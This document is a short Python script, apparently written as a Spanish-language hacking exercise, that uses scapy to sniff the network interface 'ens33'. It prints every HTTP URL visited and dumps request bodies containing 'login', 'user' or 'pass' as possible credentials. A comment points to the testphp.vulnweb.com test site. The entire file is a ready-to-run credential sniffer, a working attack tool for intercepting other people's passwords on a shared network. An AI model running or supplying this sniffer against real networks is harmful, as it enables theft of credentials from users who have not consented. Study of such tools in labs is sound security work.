#!/usr/bin/env python3

# Web for testing...
# http://testphp.vulnweb.com/
import scapy.all as scapy
from scapy.layers import http
from termcolor import colored
import signal
import sys

def def_handler(sig, frame):
  print("\n[+] Saliendo...\n")
  sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def process_packet(packet):
  cred_keywords = ['login', 'user', 'pass']

  if packet.haslayer(http.HTTPRequest) and packet.haslayer(scapy.Raw):
    # print(packet.show())
    url = f"http://{packet[http.HTTPRequest].Host.decode()}{packet[http.HTTPRequest].Path.decode()}"
    print(colored(f"[+] Url visitada: {url}", 'blue'))
    try:
      response = packet[scapy.Raw].load.decode()
      for keyword in cred_keywords:
        if keyword in response:
          print(colored(f"\n[+] Posibles credenciales: {response}\n", 'green'))
    except:
      pass

def sniff(interface: str):
  scapy.sniff(iface=interface, prn=process_packet, store=0)

def main():
   sniff('ens33')

if __name__ == '__main__':
  main()
